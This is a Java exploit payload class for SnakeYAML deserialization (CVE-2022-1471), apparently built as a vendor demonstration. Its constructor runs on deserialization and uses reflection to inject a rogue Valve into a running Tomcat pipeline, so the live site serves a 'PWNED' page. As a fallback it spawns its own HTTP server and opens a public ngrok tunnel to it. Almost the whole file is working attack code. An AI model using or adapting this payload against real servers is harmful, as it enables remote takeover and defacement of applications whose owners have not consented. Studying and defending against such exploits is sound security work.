package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.*;
import java.util.List;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    private static final String PWNED_HTML = "<!DOCTYPE html><html><head><title>PWNED</title>"
        + "<style>"
        + "* { margin: 0; padding: 0; box-sizing: border-box; }"
        + "body { background: #0d0d0d; color: #ff1744; display: flex; "
        + "justify-content: center; align-items: center; min-height: 100vh; "
        + "font-family: 'Courier New', monospace; overflow: hidden; }"
        + "@keyframes glitch { "
        + "0% { text-shadow: 2px 0 #00fff9, -2px 0 #ff00c8; } "
        + "25% { text-shadow: -2px 0 #00fff9, 2px 0 #ff00c8; } "
        + "50% { text-shadow: 2px 2px #00fff9, -2px -2px #ff00c8; } "
        + "75% { text-shadow: -2px 2px #00fff9, 2px -2px #ff00c8; } "
        + "100% { text-shadow: 2px 0 #00fff9, -2px 0 #ff00c8; } }"
        + "@keyframes flicker { "
        + "0%,19%,21%,23%,25%,54%,56%,100% { opacity:1; } "
        + "20%,24%,55% { opacity:0.4; } }"
        + "@keyframes scanline { 0% { top: -100%; } 100% { top: 100%; } }"
        + "h1 { font-size: 5em; animation: glitch 0.5s infinite, flicker 3s infinite; "
        + "letter-spacing: 0.1em; text-transform: uppercase; }"
        + "p { font-size: 1.3em; color: #ffffff; margin-top: 20px; }"
        + ".cve { color: #ff6b6b; font-weight: bold; font-size: 1.5em; }"
        + ".container { text-align: center; padding: 40px; position: relative; z-index: 1; }"
        + ".skull { font-size: 4em; margin-bottom: 20px; }"
        + ".scanline { position: fixed; width: 100%; height: 4px; "
        + "background: rgba(255,23,68,0.15); animation: scanline 6s linear infinite; z-index: 0; }"
        + ".detail { color: #555; margin-top: 40px; font-size: 0.9em; }"
        + ".blink { animation: flicker 1.5s infinite; color: #ff1744; }"
        + "</style></head>"
        + "<body>"
        + "<div class='scanline'></div>"
        + "<div class='container'>"
        + "<div class='skull'>&#9760;</div>"
        + "<h1>You've Been PWNED</h1>"
        + "<p style='margin-top:30px;'>Remote Code Execution achieved via</p>"
        + "<p class='cve'>SnakeYAML Deserialization &mdash; CVE-2022-1471</p>"
        + "<p style='margin-top:30px;color:#ccc;'>An attacker just executed arbitrary code on this server.</p>"
        + "<p style='margin-top:10px;color:#ccc;'>This HTTP server was spawned entirely from the exploit payload.</p>"
        + "<p class='detail'>The application used <span class='blink'>Yaml.load()</span> "
        + "on untrusted input, allowing arbitrary Java class instantiation.</p>"
        + "<p class='detail' style='margin-top:15px;'>Remediation: Use "
        + "<span style=\"color:#4caf50;\">Seal Security</span> patched dependencies.</p>"
        + "</div></body></html>";

    public AwesomeScriptEngineFactory() {
        try {
            // Primary: Inject a Tomcat Valve to hijack the existing app on port 8080.
            // The PWNED page replaces the real app on the SAME URL (including ngrok).
            if (!tryInjectTomcatValve()) {
                // Fallback: standalone server on port 9999
                startFallback();
            }
        } catch (Exception e) {
            try { startFallback(); } catch (Exception ignored) {}
        }
    }

    // =========================================================================
    // PRIMARY: Inject a Valve into the running Tomcat pipeline via reflection
    // so ALL subsequent requests to port 8080 return the PWNED page.
    // =========================================================================
    private boolean tryInjectTomcatValve() {
        try {
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            if (cl == null) return false;

            // 1. Get the current HTTP request via Spring's RequestContextHolder
            Class<?> rch = Class.forName(
                "org.springframework.web.context.request.RequestContextHolder", true, cl);
            Object attrs = rch.getMethod("currentRequestAttributes").invoke(null);
            Object httpReq = attrs.getClass().getMethod("getRequest").invoke(attrs);

            // 2. Unwrap: RequestFacade -> Tomcat internal Request
            Field reqField = httpReq.getClass().getDeclaredField("request");
            reqField.setAccessible(true);
            Object catalinaRequest = reqField.get(httpReq);

            // 3. Request -> Context (StandardContext) -> Pipeline
            Object context = catalinaRequest.getClass().getMethod("getContext")
                .invoke(catalinaRequest);
            Object pipeline = context.getClass().getMethod("getPipeline").invoke(context);

            // 4. Get the current first valve and the Valve interface class
            Object firstValve = pipeline.getClass().getMethod("getFirst").invoke(pipeline);
            Class<?> valveIface = Class.forName("org.apache.catalina.Valve", true, cl);
            Class<?> requestClass = Class.forName(
                "org.apache.catalina.connector.Request", true, cl);
            Class<?> responseClass = Class.forName(
                "org.apache.catalina.connector.Response", true, cl);

            // 5. Create a dynamic Valve proxy that serves PWNED HTML for all
            //    requests, chaining to the original pipeline for non-root paths
            final Object originalValve = firstValve;

            Object pwnedValve = java.lang.reflect.Proxy.newProxyInstance(cl, new Class<?>[]{valveIface},
                new InvocationHandler() {
                    private volatile Object nextValve = originalValve;

                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args)
                        throws Throwable {
                        String name = method.getName();

                        if ("invoke".equals(name) && args != null && args.length == 2) {
                            Object req = args[0];
                            Object resp = args[1];

                            // Serve PWNED page for GET /
                            try {
                                String uri = (String) req.getClass()
                                    .getMethod("getRequestURI").invoke(req);

                                if ("/".equals(uri)) {
                                    // Write directly to the Tomcat Response
                                    resp.getClass().getMethod("setContentType", String.class)
                                        .invoke(resp, "text/html; charset=UTF-8");
                                    resp.getClass().getMethod("setStatus", int.class)
                                        .invoke(resp, 200);
                                    // Get the servlet response's writer
                                    Object servletResp = resp.getClass()
                                        .getMethod("getResponse").invoke(resp);
                                    Object writer = servletResp.getClass()
                                        .getMethod("getWriter").invoke(servletResp);
                                    writer.getClass().getMethod("write", String.class)
                                        .invoke(writer, PWNED_HTML);
                                    writer.getClass().getMethod("flush").invoke(writer);
                                    return null;
                                }
                            } catch (Exception e) {
                                // Fall through to original valve on error
                            }

                            // Delegate non-root requests to the original pipeline
                            if (nextValve != null) {
                                nextValve.getClass()
                                    .getMethod("invoke", requestClass, responseClass)
                                    .invoke(nextValve, req, resp);
                            }
                            return null;
                        }

                        if ("getNext".equals(name))  return nextValve;
                        if ("setNext".equals(name))  { nextValve = args[0]; return null; }
                        if ("backgroundProcess".equals(name)) return null;
                        if ("isAsyncSupported".equals(name))  return Boolean.TRUE;
                        if ("getDomainInternal".equals(name)) return null;
                        if ("getObjectNameKeyProperties".equals(name))
                            return "type=Valve,name=pwned";

                        Class<?> rt = method.getReturnType();
                        if (rt == boolean.class) return Boolean.FALSE;
                        return null;
                    }
                });

            // 6. Inject our valve as the FIRST valve in the pipeline.
            //    Set our proxy's next -> existing first valve, then overwrite
            //    the pipeline's "first" field so all new requests hit us first.
            valveIface.getMethod("setNext", valveIface).invoke(pwnedValve, firstValve);
            Field firstField = pipeline.getClass().getDeclaredField("first");
            firstField.setAccessible(true);
            firstField.set(pipeline, pwnedValve);

            // 7. Redirect the CURRENT request (the POST that triggered the exploit)
            //    so the browser immediately loads the PWNED page via GET.
            //    This preempts the Spring controller's response.
            try {
                Object httpResp = attrs.getClass().getMethod("getResponse").invoke(attrs);
                // Determine redirect target: use ngrok URL if available, else /
                String redirectUrl = findExistingNgrokUrl();
                if (redirectUrl == null) redirectUrl = "/";
                httpResp.getClass().getMethod("sendRedirect", String.class)
                    .invoke(httpResp, redirectUrl);
            } catch (Exception ignored) {
                // If redirect fails, the next manual refresh will show PWNED
            }

            // Detect URL and open browser
            String url = findExistingNgrokUrl();
            if (url == null) url = "http://localhost:8080";
            printBanner(url);
            openBrowser(url);

            return true;

        } catch (Exception e) {
            return false;
        }
    }

    // =========================================================================
    // FALLBACK: Standalone server on port 9999 (non-Spring / local testing)
    // =========================================================================
    private void startFallback() throws Exception {
        startPwnedServer(9999);
        String ngrokUrl = tryCreateNgrokTunnel(9999);
        String url = (ngrokUrl != null) ? ngrokUrl : "http://localhost:9999";
        printBanner(url);
        openBrowser(url);
    }

    // =========================================================================
    // Shared helpers
    // =========================================================================

    private void startPwnedServer(int port) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", (HttpExchange exchange) -> {
            byte[] bytes = PWNED_HTML.getBytes("UTF-8");
            exchange.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
            exchange.sendResponseHeaders(200, bytes.length);
            OutputStream os = exchange.getResponseBody();
            os.write(bytes);
            os.close();
        });
        server.setExecutor(null);
        server.start();
    }

    private void printBanner(String url) {
        System.out.println();
        System.out.println("=============================================");
        System.out.println("  \u2620\uFE0F  [EXPLOIT] YOU'VE BEEN PWNED!  \u2620\uFE0F");
        System.out.println("  CVE-2022-1471 \u2014 SnakeYAML Deserialization");
        System.out.println("  PWNED page: " + url);
        System.out.println("=============================================");
        System.out.println();
    }

    /** Find the public URL of an existing ngrok tunnel (doesn't create one). */
    private String findExistingNgrokUrl() {
        try {
            URL url = new URL("http://localhost:4040/api/tunnels");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(3000);
            String json = readStream(conn.getInputStream());
            return extractPublicUrl(json);
        } catch (Exception e) {
            return null;
        }
    }

    /** Create a new ngrok tunnel for a given port (fallback path). */
    private String tryCreateNgrokTunnel(int port) {
        try {
            URL url = new URL("http://localhost:4040/api/tunnels");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(5000);
            String body = "{\"name\":\"pwned\",\"proto\":\"http\",\"addr\":\"" + port + "\"}";
            conn.getOutputStream().write(body.getBytes("UTF-8"));
            conn.getOutputStream().close();
            int code = conn.getResponseCode();
            if (code == 409) return getNgrokTunnelUrl("pwned");
            InputStream is = (code >= 200 && code < 300)
                ? conn.getInputStream() : conn.getErrorStream();
            return extractPublicUrl(readStream(is));
        } catch (Exception e) {
            return null;
        }
    }

    private String getNgrokTunnelUrl(String name) {
        try {
            URL url = new URL("http://localhost:4040/api/tunnels/" + name);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(2000);
            return extractPublicUrl(readStream(conn.getInputStream()));
        } catch (Exception e) {
            return null;
        }
    }

    private String extractPublicUrl(String json) {
        if (json == null) return null;
        String key = "\"public_url\":\"";
        int idx = json.indexOf(key);
        if (idx < 0) return null;
        int start = idx + key.length();
        int end = json.indexOf("\"", start);
        return (end > start) ? json.substring(start, end) : null;
    }

    private String readStream(InputStream is) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] tmp = new byte[4096];
        int n;
        while ((n = is.read(tmp)) != -1) buf.write(tmp, 0, n);
        return buf.toString("UTF-8");
    }

    private void openBrowser(String url) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("mac") || os.contains("darwin")) {
                Runtime.getRuntime().exec(new String[]{"open", url});
            } else if (os.contains("nux") || os.contains("nix")) {
                Runtime.getRuntime().exec(new String[]{"xdg-open", url});
            } else if (os.contains("win")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", url});
            }
        } catch (Exception ignored) {
            // Headless CI — RCE proven by server + console output
        }
    }

    // --- ScriptEngineFactory interface stubs (required for the exploit chain) ---
    @Override public String getEngineName() { return "pwned"; }
    @Override public String getEngineVersion() { return "1.0"; }
    @Override public List<String> getExtensions() { return List.of("pwned"); }
    @Override public List<String> getMimeTypes() { return List.of(); }
    @Override public List<String> getNames() { return List.of("pwned"); }
    @Override public String getLanguageName() { return "pwned"; }
    @Override public String getLanguageVersion() { return "1.0"; }
    @Override public Object getParameter(String key) { return null; }
    @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    @Override public String getOutputStatement(String toDisplay) { return null; }
    @Override public String getProgram(String... statements) { return null; }
    @Override public ScriptEngine getScriptEngine() { return null; }
}
